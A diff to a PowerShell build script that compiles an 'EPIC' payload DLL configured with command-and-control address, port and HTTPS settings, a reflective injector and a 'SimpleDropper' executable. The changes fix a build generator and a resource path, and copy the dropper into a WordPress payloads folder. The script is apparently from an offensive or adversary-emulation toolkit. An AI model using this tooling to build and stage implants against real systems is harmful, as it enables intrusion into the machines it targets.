@@ -144,7 +144,7 @@ if ($build.Contains("payload")) {
 	# Build the EPIC payload (run the build commands)
 	Write-Host "`nBuilding the Payload DLL..."
 
-	$output = cmake -S .\payload -B .\payload\build -DUSE_HTTPS="$https" -DC2_PORT="$c2Port" -DC2_ADDRESS:STRING="$c2Address" -DBINARY_NAME:STRING="$payloadBinary" 2>err.txt
+	$output = cmake -G "Visual Studio 17 2022" -S .\payload -B .\payload\build -DUSE_HTTPS="$https" -DC2_PORT="$c2Port" -DC2_ADDRESS:STRING="$c2Address" -DBINARY_NAME:STRING="$payloadBinary" 2>err.txt
 	errCheck
 
 	$output = cmake --build .\payload\build --config Release --target ALL_BUILD -j 4 -- 2>err.txt
@@ -228,7 +228,7 @@ if ($build.Contains("injector")) {
 if ($build.Contains("simpledropper")) {
 
 	# Set the path to the correct resource depending on http/https
-	$rcPath = "..\SimpleDropper\SimpleDropper\SimpleDropper.rc"
+	$rcPath = ".\SimpleDropper\SimpleDropper\SimpleDropper.rc"
 	(Get-Content $rcPath) -replace 'reflective_injector_https?\.exe', "$injBinary.exe" | Set-Content $rcPath
 
 	# Build the SimpleDropper executable with MSBuild.exe
@@ -247,4 +247,5 @@ if ($build.Contains("simpledropper")) {
 	Copy-Item -Path $exePath -Destination $binPath
 	Write-Host "SimpleDropper compiled exe copied to $binPath"
 
+	cp $binPath ..\payloads\wordpress\EPICDropper_http.exe
 }
